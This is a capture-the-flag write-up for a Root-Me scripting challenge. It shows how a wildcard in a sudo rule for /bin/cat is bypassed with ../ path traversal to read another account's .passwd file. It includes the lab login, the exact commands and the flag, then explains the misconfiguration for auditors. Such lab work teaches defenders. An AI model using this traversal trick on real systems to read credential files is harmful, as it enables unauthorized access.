## 1. Connect to SSH:

```bash
ssh -p 2222 app-script-ch1@challenge02.root-me.org
```
Password:
```bash
app-script-ch1
```
## 2. Check your sudo permissions

Run:
```bash
sudo -l
```
Enter the same password if requested.
```bash
app-script-ch1
```
This is the most important command for this challenge. We're looking for something like:
The allowed command is:
```bash
(app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```
## 3. Exploit Path Traversal

The sudo rule uses a wildcard:
```
/challenge/app-script/ch1/notes/*
```
We can attempt to use ../ to escape the notes directory.

The following path:
```
/challenge/app-script/ch1/notes/../ch1cracked/.passwd
```
resolves to:
```
/challenge/app-script/ch1/ch1cracked/.passwd
````
Execute:
```bash
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
```
The command successfully returns:
```bash
b3_c4r3ful_w1th_sud0
```
Flag
b3_c4r3ful_w1th_sud0
Vulnerability Explained

The vulnerable sudo configuration was:
```
(app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```
The administrator intended to restrict access to files inside the notes directory.

However, the wildcard combined with a path containing ../ allowed us to reference a file outside the intended directory.

Intended path
```
/challenge/app-script/ch1/notes/*
```
Traversal path
```
/challenge/app-script/ch1/notes/../ch1cracked/.passwd
```

## Attack Chain
SSH Login
    ↓
sudo -l
    ↓
Identify weak wildcard rule
    ↓
Find sibling directory: ch1cracked
    ↓
Use ../ path traversal
    ↓
Execute cat as app-script-ch1-cracked
    ↓
Read .passwd
    ↓
Flag obtained

## Key Takeaway

When auditing sudo configurations, pay close attention to wildcard rules such as:
```
/path/to/directory/*
```
A seemingly restricted command may still be exploitable if the allowed path can be manipulated using path traversal or other filename/path interpretation tricks.